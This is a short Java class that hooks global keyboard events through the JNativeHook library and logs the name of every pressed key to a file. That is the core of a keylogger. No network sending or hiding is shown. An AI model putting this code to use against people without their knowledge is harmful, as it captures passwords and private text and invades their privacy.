package random;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.util.logging.Logger;

public class KeyListener implements NativeKeyListener {

    private final Logger logger;

    public KeyListener(String logFilePath) throws IOException {
        LoggerConfig loggerConfig = LoggerConfig.getInstance();
        logger = loggerConfig.getLogger(logFilePath);
    }

    /**
     * Overridden method to capture the pressed keys.
     */
    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        logger.info(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
    }

    /**
     * Overridden method to capture released keys.
     */
    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
    }

    /**
     * Overridden method to capture the typed keys.
     */
    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
    }

}
